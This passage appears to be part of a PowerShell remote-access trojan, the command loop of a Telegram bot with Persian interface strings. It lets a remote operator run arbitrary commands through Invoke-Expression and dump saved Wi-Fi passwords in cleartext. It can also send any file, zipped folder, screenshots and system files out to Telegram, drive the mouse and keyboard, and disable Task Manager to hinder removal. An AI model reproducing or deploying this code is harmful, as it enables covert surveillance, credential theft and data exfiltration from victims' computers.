                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_keyboard_type"]) -ReplyMarkup $KeyboardMenu
                        Write-Log "Awaiting keyboard_type input"
                    }
                    "keyboard_press" {
                        $State = "keyboard_press"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_keyboard_press"]) -ReplyMarkup $KeyboardMenu
                        Write-Log "Awaiting keyboard_press input"
                    }
                    "system_info" {
                        Send-TelegramMessage -Text (Get-SystemInfo) -ReplyMarkup $MainMenu
                        Write-Log "System info sent"
                    }
                    "file_manager" {
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["file_manager"]) -ReplyMarkup $FileMenu
                        Write-Log "File manager menu displayed"
                    }
                    "file_list" {
                        $State = "file_list"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_file_list"]) -ReplyMarkup $FileMenu
                        Write-Log "Awaiting file_list input"
                    }
                    "file_download" {
                        $State = "file_download"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_file_download"]) -ReplyMarkup $FileMenu
                        Write-Log "Awaiting file_download input"
                    }
                    "file_upload" {
                        $State = "file_upload"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["file_upload"]) -ReplyMarkup $FileMenu
                        Write-Log "Awaiting file_upload input"
                    }
                    "record_audio" {
                        $State = "record_audio"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_record_audio"]) -ReplyMarkup $MainMenu
                        Write-Log "Awaiting record_audio input"
                    }
                    "webcam" {
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["webcam"]) -ReplyMarkup $WebcamMenu
                        Write-Log "Webcam menu displayed"
                    }
                    "webcam_photo" {
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_webcam"] -f "Webcam not supported in PowerShell") -ReplyMarkup $WebcamMenu
                        Write-Log "Webcam photo not supported" "ERROR"
                    }
                    "webcam_video" {
                        $State = "webcam_video"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_webcam_video"]) -ReplyMarkup $WebcamMenu
                        Write-Log "Awaiting webcam_video input"
                    }
                    "wifi_list" {
                        try {
                            $Profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace ".*: " }
                            $WifiInfo = @()
                            foreach ($Profile in $Profiles) {
                                $PwdResult = netsh wlan show profile name="$Profile" key=clear
                                $Password = ($PwdResult | Select-String "Key Content") -replace ".*: "
                                if ($Password) {
                                    $WifiInfo += "وای‌فای: $Profile, رمز: $Password"
                                } else {
                                    $WifiInfo += "وای‌فای: $Profile, رمز: یافت نشد"
                                }
                            }
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["wifi_list"] -f ($WifiInfo -join "`n")) -ReplyMarkup $MainMenu
                            Write-Log "WiFi networks listed"
                        } catch {
                            $ErrorMessage = "Error listing WiFi networks: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_wifi"] -f $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                    }
                    "port_scan" {
                        $State = "port_scan"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_port_scan"]) -ReplyMarkup $MainMenu
                        Write-Log "Awaiting port_scan input"
                    }
                    "popup_message" {
                        $State = "popup_message"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_popup"]) -ReplyMarkup $MainMenu
                        Write-Log "Awaiting popup_message input"
                    }
                    "zip_folder" {
                        $State = "zip_folder"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_zip_folder"]) -ReplyMarkup $MainMenu
                        Write-Log "Awaiting zip_folder input"
                    }
                    "brightness_control" {
                        $State = "brightness_control"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_brightness"]) -ReplyMarkup $MainMenu
                        Write-Log "Awaiting brightness_control input"
                    }
                    "system_files" {
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["system_files_menu"]) -ReplyMarkup $SystemFilesMenu
                        Write-Log "System files menu displayed"
                    }
                    "download_hosts" {
                        try {
                            $HostsPath = "C:\Windows\System32\drivers\etc\hosts"
                            if (Test-Path $HostsPath) {
                                Send-TelegramFile -FilePath $HostsPath -Caption "فایل hosts" -Type "document"
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["system_files_sent"] -f "hosts") -ReplyMarkup $SystemFilesMenu
                                Write-Log "Hosts file sent"
                            } else {
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_system_files"] -f "فایل یافت نشد") -ReplyMarkup $SystemFilesMenu
                                Write-Log "Hosts file not found" "ERROR"
                            }
                        } catch {
                            $ErrorMessage = "Error sending hosts file: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_system_files"] -f $_.ToString()) -ReplyMarkup $SystemFilesMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                    }
                    "download_system_ini" {
                        try {
                            $IniPath = "C:\Windows\system.ini"
                            if (Test-Path $IniPath) {
                                Send-TelegramFile -FilePath $IniPath -Caption "فایل system.ini" -Type "document"
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["system_files_sent"] -f "system.ini") -ReplyMarkup $SystemFilesMenu
                                Write-Log "System.ini file sent"
                            } else {
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_system_files"] -f "فایل یافت نشد") -ReplyMarkup $SystemFilesMenu
                                Write-Log "System.ini file not found" "ERROR"
                            }
                        } catch {
                            $ErrorMessage = "Error sending system.ini file: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_system_files"] -f $_.ToString()) -ReplyMarkup $SystemFilesMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                    }
                    "run_script" {
                        $State = "run_script"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_run_script"]) -ReplyMarkup $MainMenu
                        Write-Log "Awaiting run_script input"
                    }
                    "disable_taskmgr" {
                        try {
                            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Type DWord -Force
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["taskmgr_disabled"]) -ReplyMarkup $MainMenu
                            Write-Log "Task Manager disabled"
                        } catch {
                            $ErrorMessage = "Error disabling Task Manager: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_taskmgr"] -f $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                    }
                    "ping" {
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["ping_response"]) -ReplyMarkup $MainMenu
                        Write-Log "Ping command executed"
                    }
                }
                continue
            }

            $Text = $Update.message.text
            if (-not $Text) { continue }

            if ($State) {
                switch ($State) {
                    "open_app" {
                        try {
                            Start-Process $Text -ErrorAction Stop
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["opened"] -f $Text) -ReplyMarkup $MainMenu
                            Write-Log "Opened app: $Text"
                        } catch {
                            $ErrorMessage = "Error opening app {0}: {1}" -f $Text, $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_open"] -f $Text, $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "close_app" {
                        try {
                            Stop-Process -Name $Text -Force -ErrorAction Stop
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["closed"] -f $Text) -ReplyMarkup $MainMenu
                            Write-Log "Closed app: $Text"
                        } catch {
                            $ErrorMessage = "Error closing app {0}: {1}" -f $Text, $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_close"] -f $Text, $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "cmd" {
                        try {
                            $Result = Invoke-Expression $Text 2>&1 | Out-String
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["cmd_output"] -f $Result) -ReplyMarkup $MainMenu
                            Write-Log "Command executed: $Text"
                        } catch {
                            $ErrorMessage = "Error executing command {0}: {1}" -f $Text, $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_cmd"] -f $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "multi_screenshot" {
                        try {
                            $Parts = $Text -split ","
                            $Count = [int]$Parts[0]
                            $Delay = [float]$Parts[1]
                            if ($Count -gt 10) { $Count = 10 }
                            for ($i = 0; $i -lt $Count; $i++) {
                                $ScreenshotPath = Take-Screenshot -OutputPath (Join-Path $env:TEMP "screenshot_$i_$(Get-Date -Format 'yyyyMMdd_HHmmss').png")
                                if ($ScreenshotPath) {
                                    Send-TelegramFile -FilePath $ScreenshotPath -Caption "اسکرین‌شات $($i+1)/$Count" -Type "photo"
                                    Remove-Item $ScreenshotPath -ErrorAction SilentlyContinue
                                    Start-Sleep -Seconds $Delay
                                }
                            }
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["multi_screenshot_sent"]) -ReplyMarkup $MainMenu
                            Write-Log "Multiple screenshots sent"
                        } catch {
                            $ErrorMessage = "Error taking multiple screenshots: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_screenshot"] -f $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    {$_ -in @("shutdown", "restart", "sleep", "hibernate")} {
                        try {
                            if ((Get-MD5Hash $Text) -eq $PASSWORD_HASH) {
                                switch ($State) {
                                    "shutdown" {
                                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["shutting_down"]) -ReplyMarkup $MainMenu
                                        Start-Sleep -Seconds 5
                                        Stop-Computer -Force
                                        Write-Log "System shutdown initiated"
                                    }
                                    "restart" {
                                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["restarting"]) -ReplyMarkup $MainMenu
                                        Start-Sleep -Seconds 5
                                        Restart-Computer -Force
                                        Write-Log "System restart initiated"
                                    }
                                    "sleep" {
                                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["sleeping"]) -ReplyMarkup $MainMenu
                                        Start-Sleep -Seconds 5
                                        Add-Type -Name PowrProf -Namespace Win32 -MemberDefinition '[DllImport("powrprof.dll")] public static extern bool SetSuspendState(bool hibernate, bool forceCritical, bool disableWakeEvent);'
                                        [Win32.PowrProf]::SetSuspendState($false, $true, $false)
                                        Write-Log "System sleep initiated"
                                    }
                                    "hibernate" {
                                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["hibernating"]) -ReplyMarkup $MainMenu
                                        Start-Sleep -Seconds 5
                                        Add-Type -Name PowrProf -Namespace Win32 -MemberDefinition '[DllImport("powrprof.dll")] public static extern bool SetSuspendState(bool hibernate, bool forceCritical, bool disableWakeEvent);'
                                        [Win32.PowrProf]::SetSuspendState($true, $true, $false)
                                        Write-Log "System hibernate initiated"
                                    }
                                }
                            } else {
                                Send-TelegramMessage -Text "❌ رمز اشتباه است!" -ReplyMarkup $MainMenu
                                Write-Log "Wrong password entered" "WARNING"
                            }
                        } catch {
                            $ErrorMessage = "Error in {0}: {1}" -f $State, $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_processes"] -f $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "mouse_move" {
                        try {
                            $Parts = $Text -split ","
                            $X = [int]$Parts[0]
                            $Y = [int]$Parts[1]
                            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($X, $Y)
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["mouse_moved"] -f $X, $Y) -ReplyMarkup $MouseMenu
                            Write-Log "Mouse moved to ($X, $Y)"
                        } catch {
                            $ErrorMessage = "Error moving mouse: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_processes"] -f $_.ToString()) -ReplyMarkup $MouseMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "mouse_click" {
                        try {
                            if ($Text -in @("left", "right")) {
                                $MouseEvent = if ($Text -eq "left") { 0x0002 -bor 0x0004 } else { 0x0008 -bor 0x0010 }
                                [Mouse]::mouse_event($MouseEvent, 0, 0, 0, 0)
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["mouse_clicked"] -f $Text) -ReplyMarkup $MouseMenu
                                Write-Log "Mouse clicked: $Text"
                            } else {
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_mouse_click"]) -ReplyMarkup $MouseMenu
                                Write-Log "Invalid mouse click input" "WARNING"
                            }
                        } catch {
                            $ErrorMessage = "Error clicking mouse: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_processes"] -f $_.ToString()) -ReplyMarkup $MouseMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "mouse_multi_click" {
                        try {
                            $Parts = $Text -split ","
                            $ClickType = $Parts[0].Trim()
                            $Count = [int]$Parts[1]
                            if ($ClickType -in @("left", "right") -and $Count -le 10) {
                                $MouseEvent = if ($ClickType -eq "left") { 0x0002 -bor 0x0004 } else { 0x0008 -bor 0x0010 }
                                for ($i = 0; $i -lt $Count; $i++) {
                                    [Mouse]::mouse_event($MouseEvent, 0, 0, 0, 0)
                                    Start-Sleep -Milliseconds 100
                                }
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["mouse_multi_clicked"] -f $ClickType, $Count) -ReplyMarkup $MouseMenu
                                Write-Log "Multi-clicked: $ClickType x$Count"
                            } else {
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_mouse_multi_click"]) -ReplyMarkup $MouseMenu
                                Write-Log "Invalid multi-click input" "WARNING"
                            }
                        } catch {
                            $ErrorMessage = "Error multi-clicking mouse: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_processes"] -f $_.ToString()) -ReplyMarkup $MouseMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "mouse_scroll" {
                        try {
                            $Amount = [int]$Text
                            [Mouse]::mouse_event(0x0800, 0, 0, $Amount, 0)
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["mouse_scrolled"] -f $Amount) -ReplyMarkup $MouseMenu
                            Write-Log "Scrolled: $Amount"
                        } catch {
                            $ErrorMessage = "Error scrolling mouse: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_processes"] -f $_.ToString()) -ReplyMarkup $MouseMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "keyboard_type" {
                        try {
                            [System.Windows.Forms.SendKeys]::SendWait($Text)
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["keyboard_typed"] -f $Text) -ReplyMarkup $KeyboardMenu
                            Write-Log "Typed: $Text"
                        } catch {
                            $ErrorMessage = "Error typing text: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_processes"] -f $_.ToString()) -ReplyMarkup $KeyboardMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "keyboard_press" {
                        try {
                            if ($Text -match "\+") {
                                $Keys = $Text -split "\+"
                                [System.Windows.Forms.SendKeys]::SendWait("{$($Keys -join '}{')}")
                            } else {
                                [System.Windows.Forms.SendKeys]::SendWait("{$Text}")
                            }
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["keyboard_pressed"] -f $Text) -ReplyMarkup $KeyboardMenu
                            Write-Log "Pressed key: $Text"
                        } catch {
                            $ErrorMessage = "Error pressing key: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_processes"] -f $_.ToString()) -ReplyMarkup $KeyboardMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "file_list" {
                        try {
                            $Files = Get-ChildItem -Path $Text -Name -ErrorAction Stop | Select-Object -First 10
                            $FileList = $Files -join "`n"
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["file_listed"] -f $FileList) -ReplyMarkup $FileMenu
                            Write-Log "Listed files in $Text"
                        } catch {
                            $ErrorMessage = "Error listing files in {0}: {1}" -f $Text, $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_file"] -f $_.ToString()) -ReplyMarkup $FileMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "file_download" {
                        try {
                            if (Test-Path $Text) {
                                Send-TelegramFile -FilePath $Text -Caption (Split-Path $Text -Leaf) -Type "document"
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["file_downloaded"] -f $Text) -ReplyMarkup $FileMenu
                                Write-Log "File downloaded: $Text"
                            } else {
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_file"] -f "فایل یافت نشد") -ReplyMarkup $FileMenu
                                Write-Log "File not found: $Text" "ERROR"
                            }
                        } catch {
                            $ErrorMessage = "Error downloading file {0}: {1}" -f $Text, $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_file"] -f $_.ToString()) -ReplyMarkup $FileMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "file_upload" {
                        $UserData["upload_path"] = $Text
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["file_upload"]) -ReplyMarkup $FileMenu
                        Write-Log "Upload path set to: $Text"
                        $State = $null
                    }
                    "record_audio" {
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_audio"] -f "Audio recording not supported in PowerShell") -ReplyMarkup $MainMenu
                        Write-Log "Audio recording not supported" "ERROR"
                        $State = $null
                    }
                    "webcam_video" {
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_webcam"] -f "Webcam video not supported in PowerShell") -ReplyMarkup $WebcamMenu
                        Write-Log "Webcam video not supported" "ERROR"
                        $State = $null
                    }
                    "port_scan" {
                        try {
                            $Ports = $Text -split "," | ForEach-Object { [int]$_ }
                            $OpenPorts = @()
                            foreach ($Port in $Ports) {
                                $Result = Test-NetConnection -ComputerName "localhost" -Port $Port -WarningAction SilentlyContinue
                                if ($Result.TcpTestSucceeded) {
                                    $OpenPorts += $Port
                                }
                            }
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["port_scan_result"] -f ($OpenPorts -join ", " -or "هیچ‌کدام")) -ReplyMarkup $MainMenu
                            Write-Log "Port scan completed: $($OpenPorts -join ', ' -or 'None')"
                        } catch {
                            $ErrorMessage = "Error scanning ports: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_port_scan"] -f $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "popup_message" {
                        try {
                            msg * $Text
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["popup_sent"] -f $Text) -ReplyMarkup $MainMenu
                            Write-Log "Pop-up message displayed: $Text"
                        } catch {
                            $ErrorMessage = "Error displaying pop-up: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_processes"] -f $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "zip_folder" {
                        try {
                            $Parts = $Text -split ",", 2
                            $FolderPath = $Parts[0].Trim()
                            $FileTypes = if ($Parts.Length -gt 1) { $Parts[1].Split(",") | ForEach-Object { $_ -replace "\s+" } } else { @() }
                            if (Test-Path $FolderPath -PathType Container) {
                                $ZipPath = Join-Path $env:TEMP "folder_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
                                $Files = Get-ChildItem -Path $FolderPath -Recurse -File | Where-Object { -not $FileTypes -or $FileTypes -contains $_.Extension }
                                Compress-Archive -Path $Files.FullName -DestinationPath $ZipPath -Force
                                Send-TelegramFile -FilePath $ZipPath -Caption "پوشه فشرده: $(Split-Path $FolderPath -Leaf)" -Type "document"
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["zip_folder_sent"] -f $FolderPath) -ReplyMarkup $MainMenu
                                Remove-Item $ZipPath -ErrorAction SilentlyContinue
                                Write-Log "Zipped folder sent: $FolderPath"
                            } else {
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_zip_folder"] -f "پوشه یافت نشد") -ReplyMarkup $MainMenu
                                Write-Log "Folder not found: $FolderPath" "ERROR"
                            }
                        } catch {
                            $ErrorMessage = "Error zipping folder: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_zip_folder"] -f $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "brightness_control" {
                        try {
                            $Brightness = [int]$Text
                            if ($Brightness -ge 0 -and $Brightness -le 100) {
                                $Monitor = Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods
                                $Monitor.WmiSetBrightness(1, $Brightness)
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["brightness_set"] -f $Brightness) -ReplyMarkup $MainMenu
                                Write-Log "Brightness set to $Brightness%"
                            } else {
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_brightness"]) -ReplyMarkup $MainMenu
                                Write-Log "Invalid brightness input" "WARNING"
                            }
                        } catch {
                            $ErrorMessage = "Error setting brightness: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_processes"] -f $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                    "run_script" {
                        try {
                            $Commands = $Text -split "`n"
                            $Outputs = @()
                            foreach ($Cmd in $Commands) {
                                $Cmd = $Cmd.Trim()
                                if ($Cmd) {
                                    $Result = Invoke-Expression $Cmd 2>&1 | Out-String
                                    $Outputs += "$($Cmd):`n$($Result)"
                                }
                            }
                            $Output = $Outputs -join "`n"
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["script_executed"] -f $Output) -ReplyMarkup $MainMenu
                            Write-Log "Script executed: $Text"
                        } catch {
                            $ErrorMessage = "Error executing script: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_script"] -f $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                        $State = $null
                    }
                }
                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["menu"]) -ReplyMarkup $MainMenu
                continue
            }

            switch ($Text) {
                "/start" {
                    Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["welcome"]) -ReplyMarkup $MainMenu
                    Write-Log "Start command executed"
                }
                "/menu" {
                    Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["menu"]) -ReplyMarkup $MainMenu
                    Write-Log "Menu command executed"
                }
                "/ping" {
                    Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["ping_response"]) -ReplyMarkup $MainMenu
                    Write-Log "Ping command executed"
                }
            }
        }
    } catch {
        $ErrorMessage = "Error polling Telegram updates: {0}" -f $_.ToString()
        Write-Log $ErrorMessage "ERROR"
        Write-Host $ErrorMessage
        Start-Sleep -Seconds 5
    }
}
